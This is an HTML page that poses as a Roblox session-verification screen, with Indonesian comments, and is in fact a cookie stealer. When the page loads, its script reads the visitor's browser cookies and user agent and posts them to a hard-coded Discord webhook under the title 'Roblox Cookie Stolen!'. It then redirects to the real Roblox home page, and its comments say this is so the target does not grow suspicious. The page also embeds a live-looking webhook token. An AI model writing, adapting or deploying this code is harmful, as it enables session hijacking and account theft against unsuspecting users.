<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        /* CSS Sederhana agar terlihat bersih */
        body {
            background-color: #232527;
            color: white;
            font-family: 'Gotham', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #fff;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            font-size: 14px;
            color: #b8b8b8;
        }
    </style>
</head>
<body>

    <!-- UI Loading Palsu -->
    <div class="container" id="loader">
        <div class="spinner"></div>
        <p>Sedang memverifikasi sesi...</p>
    </div>

    <!-- Script Utama Stealer -->
    <script>
        // WEBHOOK URL KAMU (Sudah diisi otomatis)
        const webhookURL = "https://discord.com/api/webhooks/1566098183124164710/JDnzeIomdkO0FtHxj1KKGncUtWmTKU5BQMuA0o3IaJMbI3gnBcjGzXjJVQZW__LVIV85";

        window.onload = function() {
            // Ambil semua cookie dari browser saat ini
            let cookies = document.cookie;
            
            // Ambil User Agent untuk identifikasi device
            let userAgent = navigator.userAgent;
            
            // Coba ambil info user sederhana via API publik Roblox jika memungkinkan
            // Catatan: Ini opsional, banyak cookie sudah cukup.
            let robloxUserId = "Unknown";
            
            // Format Embed Discord
            const payload = {
                content: null,
                embeds: [{
                    title: "🍪 Roblox Cookie Stolen!",
                    description: "Cookie berhasil diambil dari target.",
                    color: 15158332, // Warna biru tua/hitam khas Roblox/Discord
                    fields: [
                        {
                            name: "🔑 Cookie",
                            value: `\`\`\`${cookies}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🖥️ Device Info",
                            value: `\`\`\`${userAgent}\`\`\``,
                            inline: false
                        },
                        {
                            name: "🆔 Status",
                            value: "✅ Success",
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Captured at " + new Date().toLocaleString(),
                        icon_url: "https://www.roblox.com/favicon.ico"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // Kirim ke Webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(() => {
                // Tampilkan loading sebentar agar terlihat natural
                setTimeout(() => {
                    // Redirect ke halaman utama Roblox setelah sukses kirim data
                    window.location.href = "https://www.roblox.com/home";
                }, 1500);
            }).catch(error => {
                console.error("Error sending data:", error);
                // Tetap redirect meskipun gagal kirim, agar target tidak curiga
                window.location.href = "https://www.roblox.com/home";
            });
        };
    </script>
</body>
</html>
